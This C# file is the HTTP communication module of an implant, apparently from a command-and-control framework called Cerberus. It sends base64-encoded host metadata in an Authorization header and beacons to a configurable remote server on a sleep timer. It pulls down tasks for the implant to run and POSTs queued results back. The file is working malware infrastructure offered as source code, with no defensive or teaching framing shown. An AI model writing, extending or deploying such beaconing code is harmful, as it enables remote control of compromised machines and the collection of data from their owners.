using Cerberus.Models.Tasks;
using System;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Cerberus.Models.CommModule
{
    public class HttpCommModule : CommModule
    {
        public string ConnectAddress { get; set; }
        public int ConnectPort { get; set; }
        public int SleepTime { get; set; }
        public CerberusMetadata Metadata { get; set; }

        private CancellationTokenSource _cancellationTokenSource;
        private HttpClient _httpClient;

        public HttpCommModule(string connectAddress, int connectPort, int sleepTime, CerberusMetadata metadata)
        {
            ConnectAddress = connectAddress;
            ConnectPort = connectPort;
            SleepTime = sleepTime;
            Metadata = metadata;
        }

        public override void Init(CerberusMetadata metadata)
        {
            base.Init(metadata);

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = new Uri($"http://{ConnectAddress}:{ConnectPort}");
            _httpClient.DefaultRequestHeaders.Clear();

            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());

            _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _cancellationTokenSource= new CancellationTokenSource();

            while (!_cancellationTokenSource.IsCancellationRequested)
            {
                // do we have data to send?
                if (!Outbound.IsEmpty)
                {
                    await PostData();
                }
                else
                {
                    await CheckIn();
                }

                // Sleep
                await Task.Delay(SleepTime);
            }
        }

        private async Task CheckIn()
        {
            var response = await _httpClient.GetByteArrayAsync("/");
            HandleResponse(response);
        }

        private async Task PostData()
        {
            var outbound = GetOutbound().Serialize();

            var content = new StringContent(Encoding.UTF8.GetString(outbound), Encoding.UTF8, "application/json");
            var response = await _httpClient.PostAsync("/", content);
            var responseContent = await response.Content.ReadAsByteArrayAsync();

            HandleResponse(responseContent);
        }

        private void HandleResponse(byte[] response)
        {
            var tasks = response.Deserialize<CerberusTask[]>();

            if (tasks != null && tasks.Any())
            {
                foreach ( var task in tasks)
                {
                    Inbound.Enqueue(task);
                }
            }
        }

        public override void Stop()
        {
            _cancellationTokenSource.Cancel();
        }
    }
}
